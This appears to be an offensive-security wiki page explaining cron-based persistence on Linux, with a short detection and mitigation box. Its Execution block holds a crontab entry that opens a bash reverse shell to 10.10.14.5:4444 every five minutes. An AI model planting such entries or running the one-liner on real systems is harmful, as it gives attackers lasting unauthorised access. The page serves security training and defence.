# Cron Jobs

Cron is the standard Linux/Unix job scheduler. Adding an entry to a crontab (or a system cron directory) is one of the simplest and most common ways to establish persistence on a Linux host — the scheduled command re-executes automatically, surviving reboots and reconnects.

## Why It Works

Cron jobs run with the privileges of the user (or root, for system crontabs) that owns them, and most systems already have several legitimate cron jobs running, making a new low-key entry easy to blend in. Anyone with write access to their own crontab, or root/sudo access to system cron locations, can add persistence with a single line.

## Prerequisites

* Shell access as the target user (for a user crontab), or root/sudo access (for system-wide cron locations)
* A command or script to execute (reverse shell, beacon, downloader)

## Execution

```
# Edit the current user's crontab
crontab -e

# Add a line to run a reverse shell every 5 minutes
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# System-wide locations (require root):
/etc/crontab
/etc/cron.d/
/etc/cron.{hourly,daily,weekly,monthly}/
```

{% hint style="warning" %}
Detection & Mitigation: Monitor changes to crontab files and `/etc/cron.*` directories (auditd watch rules, file integrity monitoring). Review `crontab -l` for all users periodically, and be suspicious of cron entries referencing `/tmp`, `/dev/shm`, base64-encoded commands, or unfamiliar network callbacks.
{% endhint %}

## Related

* Scheduled Tasks — the Windows equivalent
* Registry Run Keys — Windows auto-run persistence
